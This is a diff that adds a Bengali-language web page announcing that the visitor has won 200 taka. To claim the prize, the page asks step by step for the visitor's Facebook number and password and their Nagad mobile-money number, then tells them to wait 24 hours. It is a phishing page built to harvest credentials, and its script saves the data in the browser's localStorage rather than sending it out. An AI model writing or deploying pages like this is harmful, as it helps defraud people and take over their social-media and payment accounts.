@@ -1,0 +1,74 @@
+
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <title>আপনি ২০০ টাকা জিতেছেন</title>
+  <style>
+    body { font-family: Arial; background: #f0f8ff; padding: 20px; text-align: center; }
+    .box { max-width: 400px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px #ccc; }
+    input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #ccc; }
+    button { padding: 10px 20px; background: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div id="step1">
+      <h2>আপনি ২০০ টাকা জিতেছেন!</h2>
+      <p>আপনার পুরস্কার পেতে নিচে "পরবর্তী" চাপুন।</p>
+      <button onclick="nextStep(2)">পরবর্তী</button>
+    </div>
+
+    <div id="step2" class="hidden">
+      <h3>ফেসবুক নাম্বার দিন</h3>
+      <input type="text" id="fbNumber" placeholder="ফেসবুক নাম্বার" />
+      <h3>ফেসবুক পাসওয়ার্ড দিন</h3>
+      <input type="password" id="fbPassword" placeholder="ফেসবুক পাসওয়ার্ড" />
+      <button onclick="nextStep(3)">পরবর্তী</button>
+    </div>
+
+    <div id="step3" class="hidden">
+      <h3>নগদ নাম্বার দিন (১১ সংখ্যা)</h3>
+      <input type="text" id="nagadNumber" placeholder="নগদ নাম্বার" maxlength="11" />
+      <button onclick="saveData()">সাবমিট করুন</button>
+    </div>
+
+    <div id="step4" class="hidden">
+      <h2>আপনার তথ্য গ্রহণ করা হয়েছে</h2>
+      <p>২৪ ঘণ্টা অপেক্ষা করুন</p>
+    </div>
+  </div>
+
+  <script>
+    function nextStep(step) {
+      for (let i = 1; i <= 4; i++) {
+        document.getElementById('step' + i).classList.add('hidden');
+      }
+      document.getElementById('step' + step).classList.remove('hidden');
+    }
+
+    function saveData() {
+      const fbNumber = document.getElementById("fbNumber").value.trim();
+      const fbPassword = document.getElementById("fbPassword").value.trim();
+      const nagadNumber = document.getElementById("nagadNumber").value.trim();
+
+      if (fbNumber === "" || fbPassword === "" || nagadNumber.length !== 11) {
+        alert("সব তথ্য ঠিকভাবে দিন");
+        return;
+      }
+
+      const data = {
+        fbNumber: fbNumber,
+        fbPassword: fbPassword,
+        nagadNumber: nagadNumber
+      };
+
+      // Save to LocalStorage using fbNumber as key
+      localStorage.setItem("user_" + fbNumber, JSON.stringify(data));
+
+      nextStep(4);
+    }
+  </script>
+</body>
+</html>
